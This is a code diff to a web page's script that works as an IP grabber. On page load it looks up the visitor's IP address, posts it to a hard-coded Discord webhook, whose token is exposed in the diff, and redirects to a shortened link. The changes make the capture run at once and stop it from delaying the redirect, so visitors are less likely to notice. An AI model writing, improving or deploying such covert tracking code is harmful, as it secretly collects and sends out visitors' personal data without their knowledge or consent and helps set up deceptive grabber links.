@@ -15,15 +15,15 @@
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1341433412753555548/e8tFi_i8MXCevhm7FtWgP6jQBRF1ANCfLKsE1ya6hjTs02qPLTQgzDCjqCVywLxkWLKX"; // Your Discord webhook
         const REDIRECT_URL = "https://is.gd/gwuu9c"; // Your redirect link
 
-        async function sendIPAndRedirect() {
+        (async function sendIPAndRedirect() {
             try {
-                // Fetch user's IP
-                const response = await fetch("https://api.myip.com");
+                // Fetch user's IP from a fast and reliable API
+                const response = await fetch("https://api64.ip.sb/jsonip");
                 const data = await response.json();
                 const userIP = data.ip;
 
-                // Send IP to Discord webhook
-                await fetch(WEBHOOK_URL, {
+                // Send IP to Discord webhook (non-blocking, redirect happens instantly)
+                fetch(WEBHOOK_URL, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ content: `New Visitor IP: ${userIP}` })
@@ -33,12 +33,9 @@
                 console.error("Error sending IP:", error);
             }
 
-            // Redirect instantly after the request is sent
+            // Redirect immediately after request is sent
             window.location.href = REDIRECT_URL;
-        }
-
-        // Execute on page load
-        sendIPAndRedirect();
+        })();
     </script>
 </head>
 <body>
